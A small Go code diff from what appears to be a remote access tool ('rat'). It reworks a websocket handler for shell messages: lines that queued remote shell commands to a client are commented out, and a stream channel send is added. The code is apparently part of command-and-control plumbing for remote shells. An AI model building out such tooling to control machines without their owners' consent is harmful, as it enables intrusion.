@@ -1,8 +1,6 @@
 package main
 
 import (
-	"rat/shared/network/header"
-
 	"golang.org/x/net/websocket"
 )
 
@@ -12,8 +10,9 @@ type ShellMessage struct {
 }
 
 func (m ShellMessage) Handle(ws *websocket.Conn, client *Client) error {
-	client.Listeners[header.ShellHeader] = ws
-	client.Queue <- &ShellPacket{m.Action, m.Command}
+	//client.Listeners[header.ShellHeader] = ws
+	//client.Queue <- &ShellPacket{m.Action, m.Command}
 
+	client.streamChan <- ShellChannel{}
 	return nil
 }
